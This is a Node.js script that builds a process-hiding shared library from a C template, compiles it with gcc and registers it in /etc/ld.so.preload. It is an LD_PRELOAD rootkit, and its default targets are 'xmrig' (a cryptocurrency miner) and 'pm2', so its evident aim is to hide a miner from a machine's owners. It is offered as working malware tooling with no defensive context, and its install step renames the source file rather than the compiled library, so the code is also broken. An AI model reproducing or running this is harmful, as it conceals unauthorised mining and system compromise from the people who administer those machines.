const fs = require("fs");
const path = require("path");
const mkdirp = require("mkdirp");
const { exec } = require("child_process");
const { setDefine } = require("./tools");

const buildFileName = "processhider.c";
const targetFileName = "libprocesshider.so";

const projectDir = path.resolve(__dirname, "../");
const buildDir = path.resolve(projectDir, "./build");
const targetDir = "/usr/local/lib";

const tplFilePath = path.resolve(projectDir, "./src/tpl.c");
const buildFilePath = path.resolve(buildDir, buildFileName);
const targetFilePath = path.resolve(targetDir, targetFileName);

/**
 * @name build
 * @description Build c file
 * @param {Array} processFileters Process name filters. Like ["xmrig", "tmux"]
 */
async function build(processFileters) {
  if (Object.prototype.toString.call(processFileters) !== "[object Array]") {
    console.log("[ERROR] processFileters must be array.");
    return -1;
  }

  let content = "";

  try {
    content = fs.readFileSync(tplFilePath, "utf8");
  } catch (e) {
    console.log("[ERROR] Cannot find /src/tpl.c");
    return -1;
  }

  const processCount = processFileters.length;

  content = setDefine(content, "PROCESS_COUNT", processCount);
  content = setDefine(content, "PROCESS_LIST", processFileters);

  mkdirp.sync(buildDir);
  await fs.writeFileSync(buildFilePath, content, "utf8");
}

/**
 * @name compile
 * @description Compile dynamic library
 */
async function compile() {
  return new Promise((resolve, reject) => {
    exec(
      `cd ${projectDir} && gcc -Wall -fPIC -shared -o build/libprocesshider.so build/processhider.c -ldl`,
      (err, stdout, stderr) => {
        if (err) {
          console.log(err);
          reject(err);
        }

        if (stdout) console.log(stdout);
        if (stderr) console.log(stderr);
        resolve();
      }
    );
  });
}

function install() {
  return new Promise((resolve, reject) => {
    fs.rename(buildFilePath, targetFilePath, function(err) {
      if (err) {
        console.log(err);
        reject(err);
      }

      fs.stat(targetFilePath, function(err, stats) {
        if (err) {
          console.log(err);
          reject(err);
        }
        
        exec(
          `echo ${targetFilePath} >> /etc/ld.so.preload`,
          (err, stdout, stderr) => {
            if (err) {
              reject(err);
            }

            if (stdout) console.log(stdout);
            if (stderr) console.log(stderr);
            resolve();
          }
        );
      });
    });
  });
}

async function main() {
  await build(["xmrig", "pm2"]);
  await compile();
  await install();
}

main();

module.exports = {
  build,
  compile
};
